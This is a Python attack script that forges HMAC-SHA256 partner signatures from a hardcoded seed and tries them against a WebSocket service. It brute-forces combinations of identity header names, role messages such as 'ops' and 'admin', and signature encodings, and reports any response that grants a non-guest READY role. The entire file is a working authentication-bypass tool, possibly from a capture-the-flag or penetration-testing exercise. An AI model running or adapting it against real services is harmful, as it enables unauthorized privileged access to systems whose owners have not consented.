import time, select, hmac, hashlib, base64
from ws import connect, recv_frame
SEED_HEX="9b62aed8c3d31cc08cb70535ee8917176125acc68bf3191617773c452d16cc48"
KEYS=[bytes.fromhex(SEED_HEX), SEED_HEX.encode()]
NAMES=["X-Partner-Identity","X-Partner","X-VaultLink-Identity","X-Partner-Id","X-Identity","X-VaultLink-Partner"]
MSGS=["ops","admin","partner:ops","ops:partner","role:ops","ops:guest","guest:ops","vaultlink:ops","ops|","ops\n","OPS"]
def sigs(key,msg):
    d=hmac.new(key,msg.encode(),hashlib.sha256).digest()
    return [d.hex(), base64.b64encode(d).decode(), base64.urlsafe_b64encode(d).decode().rstrip("=")]
def trial(hdrs):
    try:
        s,resp=connect(extra_headers=hdrs); s.setblocking(False)
        out=[]; end=time.time()+0.55
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.06)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: break
        s.close(); return out
    except Exception: return None
hit=0; n=0
for key in KEYS:
    for msg in MSGS:
        vals=sigs(key,msg)
        for name in NAMES:
            for v in vals:
                n+=1
                out=trial({name:"ops", "X-Partner-Signature":v})
                rdy=[x for x in out or [] if isinstance(x,bytes) and x.startswith(b"READY")]
                if rdy and rdy[0]!=b"READY guest":
                    print("HIT",name,msg,v[:10],rdy,flush=True); hit+=1
print("done",n,"hits",hit)
